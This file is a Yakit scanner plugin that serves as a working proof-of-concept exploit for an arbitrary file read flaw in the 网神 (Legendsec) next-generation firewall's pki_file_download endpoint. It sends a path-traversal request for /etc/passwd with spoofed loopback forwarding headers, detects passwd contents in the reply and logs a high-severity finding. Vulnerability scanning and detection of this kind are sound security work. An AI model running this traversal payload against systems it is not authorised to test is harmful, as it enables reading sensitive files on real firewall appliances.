# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
X-Requested-With: XMLHttpRequest
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1

`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if len(rsp) > 0 {
        if str.MatchAllOfRegexp(rsp, `(\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3}`) && str.MatchAllOfSubString(rsp, "HTTP/1.1 200") {
            yakit.Info("%v 网神下一代极速防火墙pki_file_download任意文件读取漏洞", addr)
            risk.NewRisk(
            addr,risk.title("网神下一代极速防火墙pki_file_download任意文件读取漏洞"),
            risk.severity("high"),
            risk.titleVerbose("网神下一代极速防火墙pki_file_download任意文件读取漏洞"),
            risk.type("文件读取[网神下一代极速防火墙]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在网神下一代极速防火墙pki_file_download任意文件读取漏洞")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/?g=pki_file_download&filename=../../../../../etc/passwd`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}
